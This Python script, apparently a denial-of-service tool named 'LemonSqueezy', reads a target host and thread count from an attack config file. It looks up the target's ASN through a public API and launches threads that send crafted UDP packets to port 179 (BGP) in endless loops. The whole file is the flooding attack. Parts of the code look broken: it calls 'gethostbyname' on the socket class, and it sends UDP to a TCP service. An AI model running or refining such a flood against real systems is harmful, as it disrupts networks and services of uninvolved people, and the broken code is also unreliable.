import requests
from colorama import *
import os
import json
from socket import *
import threading
import time
import struct

NOTE = Fore.BLUE + "[NOTE] " + Fore.WHITE
INFO = Fore.MAGENTA + "[INFO] " + Fore.WHITE
WARN = Fore.YELLOW + "[WARN] " + Fore.WHITE
ERROR = Fore.RED + "[ERROR] " + Fore.WHITE

__location__ = os.path.realpath(
    os.path.join(os.getcwd(), os.path.dirname(__file__)))

class LemonSqueezy():
    def __init__(self):
        self.config_file = os.path.join(__location__, "attack_config.json")

        with open(self.config_file, 'r') as config_file:

            json_data = json.load(config_file)

            self.url = json_data['HOST']
            self.threading_count = json_data['THREADS']
            self.sleep_time = json_data['SLEEP']
            self.ip = socket.gethostbyname(self.url)
            self.threads_num = self.threading_count

    def get_info(self):

        print(WARN + "\n")      
        print(f"url: {self.url}\nthreads: {self.threads_num}\nsleep: {self.sleep_time}")

    def attack(self):
        packet_size = 1500
        num_packets = 1000
        threads = []
        s = socket(AF_INET, SOCK_DGRAM)

        def get_asn():
            r = requests.get(f"https://api.incolumitas.com/?q={self.ip}").json()
            return r["asn"]["asn"]

        target_as = get_asn()

        print("ASN: " + str(target_as))

        def begin():
            while True:
            # for i in range (20):
                packet = struct.pack("!BBH", 4, 2, target_as)
                s.sendto(packet, (self.url, 179))
                if self.sleep_time:
                    time.sleep(self.sleep_time)
                print(".", end="")

        for i in range(self.threading_count):
            thread = threading.Thread(target=begin)
            thread.start()
            threads.append(thread)

        for t in threads:
            t.join()